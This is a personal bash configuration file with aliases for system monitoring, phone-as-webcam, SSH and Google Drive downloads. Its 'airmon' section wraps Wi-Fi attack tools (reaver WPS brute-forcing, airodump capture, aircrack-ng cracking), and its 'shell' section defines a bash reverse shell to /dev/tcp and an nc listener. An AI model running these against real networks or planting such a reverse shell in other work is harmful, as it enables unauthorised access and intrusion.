# ~/.bashrc

# settings
stty stop ''; stty start '';
setxkbmap -option ctrl:nocaps
source /usr/share/nvm/init-nvm.sh

#xmodmap -e "keycode 135 = Super_L"
#xmodmap -e "keycode 133 = Menu"

shopt -s autocd # Allows cd without cd.
shopt -s checkwinsize # Check window size.
HISTSIZE= HISTFILESIZE= # Infinite history.

# alias
alias ls="ls --color=auto"
alias df="df -Tha --total"
alias free="free -mt"
alias grep="grep --color=auto"
alias wm-class="xprop | grep WM_CLASS"
alias wm-name="xprop | grep 'WM_NAME(STRING)'"
alias wm-size="xprop | grep REGION"
alias yayorphan="sudo pacman -Qtdq | sudo pacman -Rns -"
alias yayskip="yay -S --mflags --skipinteg"
alias equalizer="pulseaudio-equalizer-gtk"
alias spotify="/opt/spotify/spotify --force-device-scale-factor=2.5 %U"
alias cpu-stats="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\" && echo ----- && sensors | grep Core && echo ----- && sensors | grep fan'"
alias cpu-speed="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\"'"
alias cpu-temp="watch -n.5 'sensors | grep Core'"
alias cpu-fan="watch -n.5 'sensors | grep fan'"
alias display="ps aux |grep screen-off |grep -v grep"
alias xml-validate="sh ~/.config/scripts/xml.sh"
alias samsung-web="scrcpy --v4l2-sink /dev/video0 --crop=1040:2200:20:0 --turn-screen-off --window-width=1024"
alias samsung-web-fullhd="scrcpy --v4l2-sink /dev/video0 --crop=1080:1900:0:240 --turn-screen-off --window-width=1920"
alias oneplus-web="scrcpy --v4l2-sink /dev/video0 --crop=1080:2155:0:65 --turn-screen-off --max-fps=30 --window-width=1024"

# logs
function log-search() { sudo grep -rsh $1 /var/log | sort; }

# connections
alias ssh-connections="sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'"
alias smb-connections="sudo smbstatus -S && sudo smbstatus -L"
function sshc(){ ssh 192.168.100."$1" -p 80"$1"; }

# airmon
alias air-start="sudo airmon-ng start wlp5s0"
alias air-stop="sudo airmon-ng stop wlp5s0mon"
alias air-listen="sudo airodump-ng wlp5s0mon"
function air-wps-new() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -N "$3"; }
function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -s "$3"; } 
function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }

# gdrive
function gdrive () {
  CONFIRM=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate "https://docs.google.com/uc?export=download&id=$1" -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')
  wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$CONFIRM&id=$1" -O $2
  rm -rf /tmp/cookies.txt
}

# shell
function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
function shell-listen() { sudo nc -nvlp "$1"; }

# color
PS1='\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

eval "$(starship init bash)"
